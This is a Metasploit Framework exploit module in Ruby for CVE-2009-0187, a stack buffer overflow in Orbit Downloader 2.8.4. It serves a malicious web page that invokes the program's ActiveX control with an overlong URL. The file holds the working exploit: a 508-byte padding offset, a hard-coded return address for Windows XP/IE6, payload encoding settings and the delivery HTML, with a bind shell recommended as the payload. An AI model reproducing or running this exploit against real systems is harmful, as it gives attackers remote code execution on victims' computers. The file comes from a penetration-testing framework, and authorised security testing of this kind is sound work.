##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Orbit Downloader Connecting Log Creation Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in Orbit Downloader 2.8.4. When an
				attacker serves up a malicious web site, abritrary code may be executed.
				The PAYLOAD windows/shell_bind_tcp works best.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ], 
			'Version'        => '$Revision: $',
			'References'     => 
				[
					[ 'CVE', '2009-0187' ],
					[ 'BID', '33894' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 750,
					'BadChars'      => "\x00\x09\x0a\x0d'\\&",
					'StackAdjustment' => -3500,
					'PrependEncoder'  => "\x81\xc4\x54\xf2\xff\xff",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					'DisableNops'  =>  'True',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / IE 6.0 SP0-SP2',  { 'Ret' => 0x1008dee3 } ], # download.dll 2.7.0.6
				],
			'DisclosureDate' => 'Feb 3 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	  = rand_text_alpha(rand(100) + 1)
		strname = rand_text_alpha(rand(100) + 1)
		
		# Set the exploit buffer	
		sploit = "http://" + rand_text_alpha(508) + [target.ret].pack('V') + p.encoded + ".com"

		# Build out the message
		content = %Q|
		<html>
			<object classid='clsid:3F1D494B-0CEF-4468-96C9-386E2E4DEC90' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.download(#{strname}, #{vname}, #{vname}, #{vname}, 1);
			</script>
		</html>
                  |

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)
		
		# Handle the payload
		handler(cli)
	end

end
